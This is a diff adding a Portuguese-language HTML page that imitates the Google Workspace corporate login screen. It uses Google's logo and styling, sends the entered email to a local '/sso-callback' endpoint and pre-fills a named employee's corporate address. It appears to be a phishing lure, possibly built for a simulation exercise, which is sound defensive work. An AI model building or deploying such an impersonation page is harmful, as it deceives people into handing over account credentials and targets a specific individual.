@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Workspace - Login Institucional</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 25px;
+            font-size: 16px;
+        }
+
+        .btn-next {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            float: right;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+        <h2>Fazer login</h2>
+        <p>Use sua Conta do Google Corporativa</p>
+
+        <form action="/sso-callback" method="GET">
+            <input type="email" name="email" class="input-box" placeholder="E-mail corporativo" required
+                value="rafaela.camecran@luizalabs.com">
+            <div style="text-align: left; margin-bottom: 30px;">
+                <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 0.9rem; font-weight: 500;">Esqueceu
+                    seu e-mail?</a>
+            </div>
+            <p style="text-align: left; font-size: 0.85rem; line-height: 1.5;">Não é seu computador? Use o modo de
+                navegação anônima para fazer login com segurança. <a href="#"
+                    style="color: #1a73e8; text-decoration: none;">Saiba mais</a></p>
+
+            <div style="margin-top: 20px; overflow: hidden;">
+                <button type="submit" class="btn-next">Avançar</button>
+            </div>
+        </form>
+    </div>
+</body>
+
+</html>
